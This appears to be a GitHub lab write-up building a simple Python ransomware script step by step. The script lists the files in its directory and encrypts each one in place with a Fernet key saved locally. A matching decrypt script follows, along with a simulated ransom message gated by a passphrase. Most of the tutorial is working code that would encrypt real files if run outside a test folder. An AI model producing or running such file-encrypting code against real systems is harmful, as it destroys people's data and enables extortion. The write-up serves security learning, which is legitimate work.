# Step 1 – Prepare Test Environment

I created a folder called `ransomware` and added a few test files inside it.  
This simulates the “target” files for the ransomware.

<img width="1339" height="822" alt="py1" src="https://github.com/user-attachments/assets/1e4b7e18-345e-4d17-8b09-a6de15ab1e37" />

# Step 2 – Create the Script

Created a Python script called `definetlynotahacker.py` and started with:

```python
#!/usr/bin/env python3
import os

files = os.listdir()
print(files)
```
This lets us see all files in the directory.
I added an if statement to skip the script itself so it won't encrypt itself.

<img width="1372" height="811" alt="py2" src="https://github.com/user-attachments/assets/6c3022a9-4001-4ace-ad70-c3ade5241f10" />

---

# Step 3 – Filter Only Files

When I added a folder to the directory, it showed up in the list.  
To make sure only files are processed, I used:

```python
if os.path.isfile(file):
    files.append(file)
```
Now only real files are encrypted, folders are skipped.

<img width="1371" height="821" alt="py3" src="https://github.com/user-attachments/assets/261cd9bf-b30a-49f3-a63e-278a55612307" />
<img width="1460" height="898" alt="py4" src="https://github.com/user-attachments/assets/799f5766-91a2-470b-8bd5-a26ea9441e4f" />
<img width="1234" height="753" alt="py5" src="https://github.com/user-attachments/assets/06cbd08c-e4b8-4167-869f-db0b3b93f534" />

# Step 4 – Encrypt Files

Imported `Fernet` from `cryptography` to encrypt files.

### Generate Key

```python
from cryptography.fernet import Fernet

key = Fernet.generate_key()
with open("thekey.key", "wb") as thekey:
    thekey.write(key)
```
<img width="1410" height="836" alt="py6" src="https://github.com/user-attachments/assets/5134c8b0-5887-402e-818d-14d3102e5211" />
<img width="1409" height="847" alt="py7" src="https://github.com/user-attachments/assets/f317d87c-1a0d-4188-821f-eab877fb7f49" />

🔑 Important: The key is saved in thekey.key.
Without it, the files cannot be decrypted.

<img width="1369" height="830" alt="py8" src="https://github.com/user-attachments/assets/54949d31-cdc3-4b1a-8ac7-ef11b504a336" />

### Encrypt files
```python
fernet = Fernet(key)

for file in files:
    with open(file, "rb") as thefile:
        contents = thefile.read()
    contents_encrypted = fernet.encrypt(contents)
    with open(file, "wb") as thefile:
        thefile.write(contents_encrypted)
```
<img width="1387" height="855" alt="py9" src="https://github.com/user-attachments/assets/26f36788-455e-43e7-80af-3a347abed796" />
<img width="1211" height="353" alt="py10" src="https://github.com/user-attachments/assets/3b85d3a2-8636-4254-a322-e1782ff286ad" />

# Step 5 – Decrypt Files

Copied `definetlynotahacker.py` to `decrypt.py` and modified it to decrypt:

### Load the Key

```python
with open("thekey.key", "rb") as keyfile:
    secretkey = keyfile.read()

fernet = Fernet(secretkey)
for file in files:
    with open(file, "rb") as thefile:
        contents = thefile.read()
    contents_decrypted = fernet.decrypt(contents)
    with open(file, "wb") as thefile:
        thefile.write(contents_decrypted)
```
<img width="1322" height="845" alt="py11" src="https://github.com/user-attachments/assets/a2574645-6cd1-4d0e-801b-e328386e4ac0" />
<img width="1245" height="801" alt="py12" src="https://github.com/user-attachments/assets/ab29acd2-afe0-4702-a8b0-882c4fd12df8" />

## Step 6 – Simulate Ransom Message

Added a simple message and passphrase check:

- Shows a message when trying to access files  
- Requires a secret phrase to decrypt  
- Only decrypts files if the correct phrase is entered (`coffee`)

This simulates real ransomware behavior in a safe, lab environment.

<img width="975" height="173" alt="py13" src="https://github.com/user-attachments/assets/b1f29471-0ffe-4ef1-8344-c48919f94831" />
<img width="1086" height="703" alt="py14" src="https://github.com/user-attachments/assets/60adbbc1-5b72-43fe-a4fa-8049ba5af570" />

